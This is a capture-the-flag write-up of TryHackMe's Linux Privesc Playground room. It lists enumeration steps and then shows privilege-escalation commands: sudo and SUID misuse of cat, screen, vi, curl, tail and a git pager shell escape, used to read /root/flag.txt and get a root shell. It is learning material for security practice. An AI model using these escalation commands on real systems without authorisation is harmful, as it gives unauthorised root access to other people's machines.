# Linux Privesc Playground Writup
#pentest/tryhackme

## Recap
The easiest ways to approach privilege escalation on Linux is to:

1. Check what the user can run with sudo rights with `sudo -l`
2. Check programs that have `SUID` or `GUID` set.
	1. `find / -perm -u=s -type f 2>/dev/null`
	2. https://gtfobins.github.io/
3. Check what has been running through `crontab`
	1. We can use [GitHub - DominicBreuker/pspy: Monitor linux processes without root permissions](https://github.com/DominicBreuker/pspy/) for it
	2. And so inspect the crontab files
4. Find files and directories the current user has permissions to access
	1. `find / -type f -user www-data 2>/dev/null`
	2. `find / -type d -user www-data 2>/dev/null`
5. Find legit vulnerabilities instead of misconfigurations

**Part of the above can be automated through:** 
* [GitHub - itsKindred/jalesc: Just Another Linux Enumeration Script: A Bash script for locally enumerating a compromised Linux box](https://github.com/itsKindred/jalesc/)

## Other writeups
* [Linux Privesc Playground - Cyber Security / Ethical Hacking](https://666isildur.gitbook.io/ethical-hacking/tryhackme/linux-privesc-playground)
* [Linux Privesc Playground](https://blog.tryhackme.com/thm-linux-privesc-playground/)
* https://www.linkedin.com/pulse/tryhackmes-privesc-playground-writeup-simon-mccabe/

## Let’s give it a shot

```shell
$ sudo -l
    (root) NOPASSWD: /bin/apt-get*, (root) /bin/apt*, (root) /usr/bin/aria2c, (root) /usr/sbin/arp, (root)
    /bin/ash, (root) /usr/bin/awk, (root) /usr/bin/base64, (root) /bin/bash, (root) /bin/busybox, (root)
    /bin/cat, (root) /bin/chmod, (root) /bin/chown, (root) /bin/cp, (root) /usr/bin/cpan, (root)
    /usr/bin/cpulimit, (root) /bin/crontab, (root) /bin/csh, (root) /bin/curl, (root) /usr/bin/cut, (root)
    /bin/dash, (root) /bin/date, (root) /bin/dd, (root) /usr/bin/diff, (root) /bin/dmesg, (root)
    /sbin/dmsetup, (root) /usr/bin/docker, (root) /usr/bin/dpkg, (root) /usr/bin/easy_install, (root)
    /usr/bin/emacs, (root) /usr/bin/env, (root) /usr/bin/expand, (root) /usr/bin/expect, (root)
    /usr/bin/facter, (root) /usr/bin/file, (root) /usr/bin/find, (root) /usr/bin/flock, (root) /usr/bin/fmt,
    (root) /usr/bin/fold, (root) /usr/bin/ftp, (root) /usr/bin/gawk, (root) /usr/bin/gdb, (root)
    /usr/bin/gimp, (root) /usr/bin/git, (root) /bin/grep, (root) /usr/bin/head, (root) /usr/sbin/iftop, (root)
    /usr/bin/ionice, (root) /sbin/ip, (root) /usr/bin/irb, (root) /usr/bin/jq, (root) /usr/bin/ksh, (root)
    /sbin/ldconfig, (root) /usr/bin/less, (root) /sbin/logsave, (root) /usr/bin/ltrace, (root) /usr/bin/lua,
    (root) /usr/bin/make, (root) /usr/bin/man, (root) /usr/bin/mawk, (root) /bin/more, (root) /bin/mount,
    (root) /usr/bin/mtr, (root) /bin/mv, (root) /usr/bin/nano, (root) /usr/bin/nawk, (root) /bin/nc, (root)
    /usr/bin/nice, (root) /usr/bin/nl, (root) /usr/bin/nmap, (root) /usr/sbin/node, (root) /usr/bin/od, (root)
    /usr/bin/openssl, (root) /usr/bin/perl, (root) /usr/bin/pg, (root) /usr/bin/php, (root) /usr/bin/pic,
    (root) /usr/bin/pico, (root) /usr/bin/pip, (root) /usr/bin/puppet, (root) /usr/bin/python, (root)
    /usr/bin/readelf, (root) /usr/bin/redm, (root) /usr/bin/rlwrap, (root) /usr/bin/rsync, (root)
    /usr/bin/ruby, (root) /usr/bin/run-mailcaps, (root) /bin/run-parts, (root) /usr/bin/rvim, (root)
    /usr/bin/scp, (root) /usr/bin/screen, (root) /usr/bin/script, (root) /bin/sed, (root) /usr/sbin/service,
    (root) /usr/bin/setarch, (root) /usr/bin/sftp, (root) /usr/bin/smbclient, (root) /usr/bin/socat, (root)
    /usr/bin/sort, (root) /usr/bin/sqlite3, (root) /usr/bin/ssh, (root) /sbin/start-stop-daemon, (root)
    /usr/bin/stdbuf, (root) /usr/bin/strace, (root) /usr/bin/tail, (root) /bin/tar, (root) /usr/bin/taskset,
    (root) /usr/bin/tclsh, (root) /usr/sbin/tcpdump, (root) /usr/bin/tee, (root) /usr/bin/telnet, (root)
    /usr/bin/tftp, (root) /usr/bin/time, (root) /usr/bin/timeout, (root) /usr/bin/tmux, (root) /usr/bin/ul,
    (root) /usr/bin/unexpand, (root) /usr/bin/uniq, (root) /usr/bin/unshare, (root) /usr/bin/vi, (root)
    /usr/bin/vim, (root) /usr/bin/watch, (root) /usr/bin/wget, (root) /usr/bin/xargs, (root) /usr/bin/xxd,
    (root) /usr/bin/zip, (root) /usr/bin/zsh
```

Holy crap… so many! 

Note that `cat` can be run as `sudo`, so all we really need to do is:

```shell
$ cat /root/flag.txt
THM{3asy_f14g_1m40}
```

Let’s pick another random one… `/usr/bin/screen` -> [screen | GTFOBins](https://gtfobins.github.io/gtfobins/screen/)

```shell
$ sudo screen
$ cat /root/flag.txt
THM{3asy_f14g_1m40}
```

That was easy, let’s try another one: `/usr/bin/vi` 

```shell
$ sudo vi -c ':!/bin/sh' /dev/null
"/dev/null" is not a file
:!/bin/sh
# whoami
root
# cat /root/flag.txt
Congratulations! You got the easiest flag on THM!
THM{3asy_f14g_1m40}
```

Let’s try `curl`

```shell
$ LFILE=/root/flag.txt
$ curl file://$LFILE
Congratulations! You got the easiest flag on THM!
THM{3asy_f14g_1m40}
```

Let’s try a few SUIDs:

```shell
$ find / -perm -u=s -type f 2>/dev/null
/usr/sbin/arp
/usr/sbin/node
/usr/sbin/uuidd
/usr/sbin/pppd
/usr/lib/eject/dmcrypt-get-device
/usr/lib/pt_chown
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/openssh/ssh-keysign
/usr/bin/wget
/usr/bin/cut
/usr/bin/base64
/usr/bin/traceroute6.iputils
/usr/bin/tail
/usr/bin/aria2c
/usr/bin/ul
/usr/bin/shuf
/usr/bin/php5
/usr/bin/gpasswd
/usr/bin/make
/usr/bin/openssl
/usr/bin/file
/usr/bin/tclsh8.5
/usr/bin/env
```

And a billion more!

Let’s try…. tail?

```shell
$ LFILE=/root/flag.txt
$ tail -c1G "$LFILE"
Congratulations! You got the easiest flag on THM!
THM{3asy_f14g_1m40}
```

Git pager time!

```shell
You can paginate output from git using a custom pager from the PAGER env var (docs at https://www.git-scm.com/docs/git/2.23.0).
Git runs as root so we exploit this fact using:
PAGER='sh -c "exec sh 0<&1"' git -p help
```